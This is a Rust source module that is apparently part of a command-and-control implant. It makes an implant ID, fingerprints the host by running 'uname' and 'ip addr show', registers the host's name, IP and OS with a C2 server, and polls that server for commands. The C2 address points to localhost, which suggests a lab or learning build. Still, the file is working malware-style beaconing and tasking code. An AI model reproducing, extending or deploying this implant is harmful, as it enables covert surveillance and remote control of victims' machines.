use reqwest::Client;
use serde_json::json;
use std::process::Command;
use std::string::FromUtf8Error;
use std::time::{SystemTime, UNIX_EPOCH};
use std::str::from_utf8;




use crate::SERVER_ADDR; // Add this line to import SERVER_ADDR


// Constants
const C2_SERVER: &str = "http://127.0.0.1:5000";

// NEED A NEW WAY TO DO THIS
// Generate a unique implant ID
pub fn generate_implant_id() -> String {
    let start = SystemTime::now();
    let since_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
    format!("implant-{}", since_epoch.as_secs())
}

// Get Hostname
pub fn get_hostname() -> Result<String, FromUtf8Error> {
    let output = Command::new("uname")
        .arg("-a")
        .output()
        .expect("Failed to execute 'uname -a'");

    String::from_utf8(output.stdout)
}

// Get the IP address
pub fn get_ip_address() -> Result<String, Box<dyn std::error::Error>> {
    let output = Command::new("ip")
        .arg("addr")
        .arg("show")
        .output()?;
    let output_str = from_utf8(&output.stdout)?;
    let ip_re = regex::Regex::new(r"(?m)inet (?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")?;
    let captures = ip_re.captures_iter(output_str).next();
    match captures {
        Some(caps) => Ok(caps["ip"].to_string()),
        None => Err("Unable to get IP address".into()),
    }
}

// Get the OS information
pub fn get_os() -> Result<String, Box<dyn std::error::Error>> {
    let output = Command::new("uname")
        .arg("-o")
        .output()?;
    let os = from_utf8(&output.stdout)?.trim().to_string();
    Ok(os)
}

// Send the initial check-in request to the C2 server
pub async fn initial_check_in(implant_id: &str, hostname: &str, ip_address: &str, os: &str) -> Result<(), Box<dyn std::error::Error>> {
    use chrono::prelude::*;
    
    let client = Client::new();
    let current_time = Utc::now();
    let implant_data = json!({
        "implant_id": implant_id,
        "hostname": hostname,
        "ip_address": ip_address,
        "os": os,
        "first_seen": current_time.to_rfc3339(),
        "last_seen": current_time.to_rfc3339(),
    });
    let res = client.post(&format!("{}/register_implant", C2_SERVER))
        .json(&implant_data)
        .send()
        .await?;
    if res.status().is_success() {
        println!("Implant registered successfully.");
    } else {
        println!("Failed to register the implant.");
        println!("Response status: {:?}", res.status());
        println!("Response body: {:?}", res.text().await?);
    }
    Ok(())
}


// Check for new commands from the C2 server
pub async fn check_for_commands(implant_id: &str) -> Result<Option<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let url = format!("http://{}:{}/get_command/{}", SERVER_ADDR.0, SERVER_ADDR.1, implant_id);
    println!("[*] Sending GET request to {}", url); // Add this line to print the GET request URL
    let response = client.get(&url).send().await?;

    if response.status().is_success() {
        let body = response.text().await?;
        println!("[*] Response body: {}", body); // Add this line to print the response body
        let json_response: serde_json::Value = serde_json::from_str(&body)?;
        if let Some(commands) = json_response.get("commands") {
            if let Some(first_command) = commands.as_array().and_then(|arr| arr.get(0)) {
                return Ok(Some(first_command.as_str().unwrap().to_string()));
            }
        }
    }

    Ok(None)
}




